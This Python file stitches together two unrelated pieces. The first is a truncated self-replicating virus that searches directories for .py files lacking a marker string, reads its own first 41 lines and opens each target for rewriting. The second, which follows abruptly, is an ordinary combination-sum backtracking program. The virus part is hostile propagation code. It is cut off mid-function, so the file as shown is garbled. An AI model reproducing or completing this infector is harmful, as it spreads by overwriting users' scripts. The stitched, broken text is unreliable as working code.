#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to find all combinations that
# sum to a given value
 
def combinationSum(arr, sum):
    ans = []
    temp = []
 
    # first do hashing nothing but set{}
    # since set does not always sort
    # removing the duplicates using Set and
    # Sorting the List
    arr = sorted(list(set(arr)))
    findNumbers(ans, arr, temp, sum, 0)
    return ans
 
def findNumbers(ans, arr, temp, sum, index):
     
    if(sum == 0):
         
        # Adding deep copy of list to ans
        ans.append(list(temp))
        return
       
    # Iterate from index to len(arr) - 1
    for i in range(index, len(arr)):
 
        # checking that sum does not become negative
        if(sum - arr[i]) >= 0:
 
            # adding element which can contribute to
            # sum
            temp.append(arr[i])
            findNumbers(ans, arr, temp, sum-arr[i], i)
 
            # removing element from list (backtracking)
            temp.remove(arr[i])
 
 
# Driver Code
arr = [2, 4, 6, 8]
sum = 8
ans = combinationSum(arr, sum)
 
# If result is empty, then
if len(ans) <= 0:
    print("empty")
     
# print all combinations stored in ans
for i in range(len(ans)):
 
    print("(", end=' ')
    for j in range(len(ans[i])):
        print(str(ans[i][j])+" ", end=' ')
    print(")", end=' ')
 
 
# This Code Is Contributed by Rakesh(vijayarigela09)
# Time Complexity: O(n^2) where n is the size of array
# Space Complexity: O(n^2)